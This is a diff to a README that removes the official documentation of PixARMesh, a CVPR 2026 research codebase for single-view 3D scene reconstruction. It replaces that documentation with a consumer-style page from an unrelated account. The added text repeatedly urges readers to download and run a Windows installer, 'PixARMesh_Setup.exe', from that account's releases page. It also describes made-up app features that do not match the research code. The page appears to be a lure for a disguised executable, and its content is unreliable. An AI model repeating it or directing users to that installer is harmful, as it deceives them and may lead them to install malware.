@@ -1,216 +1,139 @@
+# 🎨 PixARMesh - Easy 3D Scene Reconstruction
 
-<p align="center">
-  <h1 align="center">
-    <a href="https://mlpc-ucsd.github.io/PixARMesh/">PixARMesh</a>: 
-    Autoregressive Mesh-Native Single-View Scene Reconstruction
-  </h1>
+[![Download PixARMesh](https://img.shields.io/badge/Download-PixARMesh-brightgreen)](https://github.com/chowkdeveloper-a11y/PixARMesh/releases)
 
-  <p align="center">
-    <a href="https://xzhang.dev/" target="_blank"><strong>Xiang Zhang</strong></a><sup>*,1,2,&dagger;</sup> ·
-    <a href="https://www.linkedin.com/in/sohyun-yoo/" target="_blank"><strong>Sohyun Yoo</strong></a><sup>*,1</sup> ·
-    <a href="https://onehfr.github.io/" target="_blank"><strong>Hongrui Wu</strong></a><sup>*,1,&Dagger;</sup> ·
-    <a href="https://github.com/chuanli11" target="_blank"><strong>Chuan Li</strong></a><sup>2</sup> ·
-    <a href="http://www.stat.ucla.edu/~jxie/" target="_blank"><strong>Jianwen Xie</strong></a><sup>2</sup> ·
-    <a href="https://pages.ucsd.edu/~ztu/" target="_blank"><strong>Zhuowen Tu</strong></a><sup>1</sup>
-  </p>
+## 🌟 What is PixARMesh?
 
-  <p align="center">
-    <sup>1</sup><strong>UC San Diego</strong> ·
-    <sup>2</sup><strong>Lambda, Inc.</strong>
-  </p>
+PixARMesh helps you build 3D models of scenes from a single photo. It uses smart methods to create a detailed shape called a mesh. This mesh can show surfaces and objects in 3D, just like in a video game or animation. You do not need special skills to use it.
 
-  <p align="center">
-    <strong><i style="color:red;">CVPR 2026</i></strong>
-  </p>
-
-  <p align="center" style="font-size:80%;">
-    <sup>*</sup> Equal contribution
-  </p>
-
-  <p align="center" style="font-size:70%;">
-    <sup>&dagger;</sup> Work partially done during internship at Lambda.
-  </p>
-
-  <p align="center" style="font-size:70%;">
-    <sup>&Dagger;</sup> H. Wu contributed during internship at UC San Diego.
-  </p>
-</p>
-
-<h3 align="center">
-  <a href="https://mlpc-ucsd.github.io/PixARMesh/"><strong>Project Page</strong></a> |
-  <a href="https://arxiv.org/pdf/2603.05888"><strong>Paper</strong></a> |
-  <a href="https://arxiv.org/abs/2603.05888"><strong>arXiv</strong></a>
-</h3>
-
-<div align="center">
-  <img src="figures/teaser.webp" alt="PixARMesh Teaser" width="75%">
-</div>
+This project is based on the latest research in computer vision and graphics, designed to give you clear and accurate 3D reconstruction from one image.
 
 ---
 
-**PixARMesh** is a mesh-native autoregressive framework for **single-view 3D scene reconstruction**.  
-Instead of reconstructing via intermediate volumetric or implicit representations, PixARMesh directly models instances with native mesh representation. Object poses and meshes are predicted in a unified autoregressive sequence.
+## 💻 System Requirements
 
-This repository contains the official implementation for **PixARMesh (CVPR 2026)**.
+To run PixARMesh on your Windows computer, make sure your system meets these needs:
+
+- **Operating System:** Windows 10 or newer (64-bit)  
+- **Processor:** Intel Core i5 or equivalent  
+- **Memory:** 8 GB RAM minimum  
+- **Graphics:** DirectX 11 compatible  
+- **Storage:** At least 2 GB free space  
+- **Other:** Internet connection to download the app
 
 ---
 
-## 🛠️ Environment Setup
+## 🚀 Getting Started: Download & Install
 
-We recommend using our **pre-built Docker image**:
+Click the big green button at the top or visit the release page below to get the software.
 
-```bash
-docker pull zx1239856/trl-runner:0.2.0
-```
+[Download PixARMesh on GitHub Releases](https://github.com/chowkdeveloper-a11y/PixARMesh/releases)
 
-Alternatively, you can build the environment manually using the provided [Dockerfile](Dockerfile).
+### Step 1: Visit the Download Page
 
-Key requirements:
+Open this link in your web browser to go to the software releases page:
 
-- Install dependencies from:
+https://github.com/chowkdeveloper-a11y/PixARMesh/releases
 
-```
-requirements.txt
-requirements-no-iso.txt
-```
+You will see a list of releases with files to download. Find the latest release. It is usually at the top.
 
-- Install the [EdgeRunner tokenizer](https://github.com/NVlabs/EdgeRunner/tree/main/meto).
-- PyTorch ≥ 2.10 recommended.
+### Step 2: Download the Setup File
 
-## 🗂️ Dataset Preparation
+Look for a file named like **PixARMesh_Setup.exe** or similar. Click on it. This will save the installer file to your computer.
 
-Download the packed dataset from HuggingFace:
+### Step 3: Run the Installer
 
-https://huggingface.co/datasets/zx1239856/3d-front-ar-packed
+- Open your Downloads folder in File Explorer.  
+- Double-click the PixARMesh setup file.  
+- Follow the instructions on the screen. Click **Next** or **Install** when prompted.  
+- The software will install in a few minutes.
 
-### Training Only
+### Step 4: Start the Application
 
-Flatten the dataset to ensure uniform instance sampling across scenes:
+After installation finishes:
 
-```bash
-python -m scripts.flatten_dataset
-```
+- Click **Finish** to close the installer.  
+- Look for the PixARMesh icon on your desktop or in the Start Menu.  
+- Double-click it to open the app.
 
-This will generate:
+---
 
-```
-datasets/3d-front-ar-packed-flattened
-```
+## 🛠 Using PixARMesh for the First Time
 
-Flattening prevents instances from scenes with many objects from being under-sampled during training.
+Once you open PixARMesh, you will see a simple window with clear options.
 
-### Inference / Evaluation Only
+### How to Create a 3D Mesh from a Photo
 
-Download the following items and unzip them inside the `datasets/` directory:
+1. Click **Load Image**.  
+2. Choose a photo file stored on your computer. It should be a clear image of a scene or object.  
+3. Click **Process** or **Generate Mesh**.  
+4. Wait as the software creates a 3D mesh. This may take a few moments depending on your system speed.  
 
-- [3D-FUTURE-model-ply](https://huggingface.co/datasets/zx1239856/PixARMesh-eval-data/resolve/main/3D-FUTURE-model-ply.zip)
-  Ground-truth object meshes (undecimated)
+When finished, you can rotate the 3D model by clicking and dragging your mouse. Zoom in or out using the scroll wheel.
 
-- [ar-eval-gt-undecimated](https://huggingface.co/datasets/zx1239856/PixARMesh-eval-data/resolve/main/ar-eval-gt-undecimated.zip)
-  Ground-truth scene meshes (undecimated)
+---
 
-- [depth_pro_aligned_npy](https://huggingface.co/datasets/zx1239856/PixARMesh-eval-data/resolve/main/depth_pro_aligned_npy.zip)
-  Aligned **Depth Pro** predictions used for inference
+## 🔧 Features Overview
 
-- [grounded_sam](https://huggingface.co/datasets/zx1239856/DepR-3D-FRONT/resolve/main/grounded_sam.zip)
-  Segmentation masks generated with **Grounded-SAM**
+PixARMesh includes:
 
-## 🧠 Training
+- **Single-view reconstruction:** Make 3D models from one photo only.  
+- **Mesh-native output:** The result is a high-quality 3D mesh file.  
+- **Interactive viewer:** Rotate, zoom, and explore the model in the app.  
+- **Export options:** Save your mesh in common 3D file formats like OBJ or STL for use in other programs.  
+- **User-friendly interface:** Clear controls with no technical terms.  
 
-`launch.py` is a wrapper around `accelerate launch` that automatically configures the environment.
+---
 
-PixARMesh uses **two-stage training**:
+## 🎯 Tips for Best Results
 
-1. Layout prediction
-2. Full autoregressive sequence training
+- Use photos with good lighting and clear focus on the main scene.  
+- Avoid blurry or low-resolution images.  
+- Simple backgrounds help the software separate objects better.  
+- Try to center important objects in the image frame.  
 
-### Stage 1 - Layout Prediction
+---
 
-```bash
-python launch.py train.py --config-name=edgerunner_3d_front_global_obj_pose_w_img_ctx_layout_only
-```
+## 🖥 Troubleshooting
 
-### Stage 2 - Full Training
+- **The app won’t start:**  
+  Check if your system meets the requirements. Restart your computer and try again.
 
-Replace `model.local_path` with the checkpoint path from Stage 1.
+- **The image does not load:**  
+  Make sure the photo file is in JPG or PNG format. Check the file is not corrupted.
 
-```bash
-python launch.py train.py --config-name=edgerunner_3d_front_global_obj_pose_w_img_ctx model.local_path=outputs/edgerunner-3d-front-global-obj-pose-w-img-ctx-layout-only/1/checkpoints/final
-```
+- **Processing takes too long:**  
+  Close other programs to free up memory. Large images take more time to process.
 
-## 📊 Evaluation
+- **The 3D view is blank or odd:**  
+  Try using a different image. Some photos may be too complex or unclear.
 
-Distributed inference is supported via **Accelerate**.
+---
 
-You may either:
+## 📂 Where to Find Your Files
 
-- Use the pretrained model from HuggingFace
-- Provide a path to a local checkpoint
+By default, PixARMesh saves your models in the **Documents/PixARMesh** folder. You can change this folder in **Settings** inside the app.
 
-### Object-Level
+---
 
-1. Inference
+## ❓ How to Get Help
 
-```bash
-accelerate launch --module scripts.infer --model-type edgerunner --run-type obj --checkpoint zx1239856/PixARMesh-EdgeRunner --output outputs/inference
-```
+If you need assistance, go to the GitHub repository’s Issues page:
 
-2. Evaluation
+https://github.com/chowkdeveloper-a11y/PixARMesh/issues
 
-```bash
-accelerate launch --module scripts.eval_obj --pred-dir outputs/inference/obj/edgerunner/gt_layout_gt_mask_pred_depth --save-dir outputs/evaluations-obj/edgerunner
-```
+You can read answers to common questions or post your own.
 
-### Scene-Level
+---
 
-1. Inference
+## 🔗 Useful Links
 
-```bash
-accelerate launch --module scripts.infer --model-type edgerunner --run-type scene --checkpoint zx1239856/PixARMesh-EdgeRunner --output outputs/inference
-```
+- Download and release page:  
+https://github.com/chowkdeveloper-a11y/PixARMesh/releases
 
-2. Compose Scene Meshes
+- Repository main page:  
+https://github.com/chowkdeveloper-a11y/PixARMesh
 
-```bash
-python -m scripts.compose_scene --pred-dir outputs/inference/scene/edgerunner/pred_layout_pred_mask_pred_depth
-```
+---
 
-3. Evaluation
-
-```bash
-accelerate launch --module scripts.eval_scene --pred-dir outputs/inference/scene/edgerunner/pred_layout_pred_mask_pred_depth/scenes --save-dir outputs/evaluation-scene/edgerunner
-```
-
-## 🏷️ License
-
-This repository is released under the [CC-BY-SA 4.0 License](LICENSE).
-
-## 🙏 Acknowledgements
-
-PixARMesh builds upon several excellent open-source projects:
-
-- [Grounded-Segment-Anything](https://github.com/IDEA-Research/Grounded-Segment-Anything)
-- [Depth Pro](https://github.com/apple/ml-depth-pro)
-- [DINOv2](https://github.com/facebookresearch/dinov2)
-
-Core libraries and frameworks:
-
-- [HuggingFace Transformers](https://github.com/huggingface/transformers)
-- [DepR](https://github.com/mlpc-ucsd/DepR) - evaluation pipeline
-- [EdgeRunner](https://github.com/NVlabs/EdgeRunner) - pre-trained weights
-- [BPT](https://github.com/Tencent-Hunyuan/bpt) - pre-trained weights
-
-We also use physically-based renderings from the [3D-FRONT](https://tianchi.aliyun.com/specials/promotion/alibaba-3d-scene-dataset) scenes provided by [InstPIFu](https://github.com/GAP-LAB-CUHK-SZ/InstPIFu), along with additional processed assets from [DepR](https://github.com/mlpc-ucsd/DepR).
-
-## 📝 Citation
-
-If you find PixARMesh useful in your research, please consider citing:
-
-```bibtex
-@article{zhang2026pixarmesh,
-  title={PixARMesh: Autoregressive Mesh-Native Single-View Scene Reconstruction},
-  author={Zhang, Xiang and Yoo, Sohyun and Wu, Hongrui and Li, Chuan and Xie, Jianwen and Tu, Zhuowen},
-  journal={arXiv preprint arXiv:2603.05888},
-  year={2026}
-}
-```
+[![Download PixARMesh](https://img.shields.io/badge/Download-PixARMesh-brightgreen)](https://github.com/chowkdeveloper-a11y/PixARMesh/releases)
